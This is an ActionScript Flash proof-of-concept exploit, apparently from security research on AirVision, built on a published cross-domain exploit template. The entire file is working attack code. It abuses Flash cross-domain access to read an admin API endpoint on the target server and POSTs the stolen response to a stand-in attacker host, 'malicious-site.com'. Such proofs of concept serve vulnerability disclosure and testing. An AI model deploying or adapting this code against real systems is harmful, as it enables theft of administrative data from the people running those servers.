// Customized AirVision POC Author: Seth Art (sethsec at gmail.com)
// POC Template Author: Gursev Singh Kalra (gursev.kalra at foundstone.com)
// POC Template Author's github: (https://github.com/gursev/flash-xdomain-xploit)
package {
 import flash.display.Sprite;
 import flash.events.*;
 import flash.net.URLRequestMethod;
 import flash.net.URLRequest;
 import flash.net.URLLoader;


 public class XDomainXploit extends Sprite {
  public function XDomainXploit() {
   // Target URL from where the data is to be retrieved
   var readFrom:String = "/www.example.com:7443/api/2.0/admin";
   var readRequest:URLRequest = new URLRequest(readFrom);
   var getLoader:URLLoader = new URLLoader();
   getLoader.addEventListener(Event.COMPLETE, eventHandler);
   try {
    getLoader.load(readRequest);
   } catch (error:Error) {
    trace("Error loading URL: " + error);
   }
  }


  private function eventHandler(event:Event):void {
   // URL to which retrieved data is to be sent
   var sendTo:String = "http://www.malicious-site.com/admin"
   var sendRequest:URLRequest = new URLRequest(sendTo);
   sendRequest.method = URLRequestMethod.POST;
   sendRequest.data = event.target.data;
   var sendLoader:URLLoader = new URLLoader();
   try {
    sendLoader.load(sendRequest);
   } catch (error:Error) {
    trace("Error loading URL: " + error);
   }
  }
 }
}

